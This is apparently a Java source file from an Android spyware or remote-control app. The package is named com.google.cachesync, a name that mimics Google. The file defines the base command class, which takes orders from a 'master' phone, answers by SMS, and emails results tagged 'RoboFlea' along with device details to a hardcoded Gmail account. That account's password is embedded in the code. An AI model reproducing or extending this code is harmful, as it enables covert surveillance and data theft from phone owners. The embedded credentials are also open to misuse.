package com.google.cachesync;

import java.util.ArrayList;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import android.telephony.SmsManager;

import com.code4bones.utils.Mail;
import com.code4bones.utils.NetLog;

public class CommandObj extends Object implements ICommandObj {

	public final static String MAIL_USER = "muser";
	public final static String MAIL_PASS = "mpass";
	public final static String MAIL_TO = "mto";
	public final static String ACK = "ack";
	public final static String PREF_NAME ="cachesync";
	
	public final static int ERROR = -1;
	public final static int OK 		  = 0;
	public final static int REPLY  = 1;
	
	public String argSource;
	public Context mContext;
	public String commandName;
	public String helpString;
	public String commandResult = new String("");
	public CommandArgs args;
	public String masterPhone;
	

	public CommandObj(String name) {
		super();
		commandName = name;
		helpString = "";
	}
	
	public CommandObj(String name,String help)
	{
		super();
		commandName = name;
		helpString = help;
	}

	public void initCommand(Context context,String masterPhone,String source) throws Exception {
		this.argSource = source;
		this.args  = new CommandArgs(source);
		this.masterPhone = masterPhone;
		this.mContext = context;
		NetLog.v("Command from %s \"%s\"\n",masterPhone,commandName);
	}
	
	public int Invoke() throws Exception {
		NetLog.v("Default Invoke: \"%s\"",commandName);
		return OK;
	}
	
	public void Reply(Object ... argv) throws Exception {
		NetLog.v("Default Reply: \"%s\"\r\n", commandName);
	}

	public void sendSMS(String phone,String fmt,Object ... argv) {
		String msg = String.format(fmt, argv);
		SmsManager mgr = (SmsManager)SmsManager.getDefault();
		ArrayList<String> parts = mgr.divideMessage(msg);
		if ( parts.size() > 1 )
			mgr.sendMultipartTextMessage(phone, null, parts, null, null);
		else
			mgr.sendTextMessage(phone, null, msg, null,null);
	}
	
	public void replySMS(String fmt,Object ... argv) {
		sendSMS(masterPhone,fmt,argv);
	}
	
	
	public Mail createMail() throws Exception {
		
		SharedPreferences pref = mContext.getSharedPreferences(CommandObj.PREF_NAME,1);
		
		String user = pref.getString(CommandObj.MAIL_USER, "clinch.coffin@gmail.com");
		String pass = pref.getString(CommandObj.MAIL_PASS,"20834999");
		String mto = pref.getString(CommandObj.MAIL_TO, "clinch.coffin@gmail.com");
		
		Mail m = new Mail(user,pass);
		String subj = String.format("RoboFlea.%s.%s.%s - %s",Build.PRODUCT,Build.MANUFACTURER,Build.USER,commandName);
		
		m.setTo(new String[]{mto});
		m.setFrom(user);
		m.setSubject(subj);
		m.setBody(commandResult);
	//	NetLog.v("Mail: %s/%s -> %s\r\n",user,pass,mto);
		return m;
	}
}
